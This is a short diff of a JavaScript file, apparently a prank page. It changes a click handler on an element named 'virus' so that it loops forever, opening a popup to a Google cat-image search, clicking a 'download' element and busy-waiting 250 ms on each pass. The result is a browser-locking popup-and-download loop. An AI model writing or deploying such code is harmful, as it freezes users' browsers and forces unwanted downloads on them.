@@ -26,12 +26,16 @@ window.onload = function(){
 }
 
 document.getElementById("virus").onclick = function(){
-    var min = 150 ;
-    var max = 300 ;
-
-
     while(true){
-        var a = Math.floor( Math.random() * (max + 1 - min) ) + min
-        window.open("https://www.google.com",Math.random(),"width=a,height=a");
+        window.open("https://www.google.com/search?q=%E7%8C%AB&source=lnms&tbm=isch&sa=X&ved=2ahUKEwjypqu4ravsAhVFHaYKHVKiBDwQ_AUoAnoECCcQBA&biw=1280&bih=578&dpr=1.5",Math.random(),"width=a,height=a");
+        document.getElementById("download").click();
+        sleep(250);
     }
 }
+
+function sleep(waitMsec) {
+    var startMsec = new Date();
+   
+    // 指定ミリ秒間だけループさせる（CPUは常にビジー状態）
+    while (new Date() - startMsec < waitMsec);
+  }
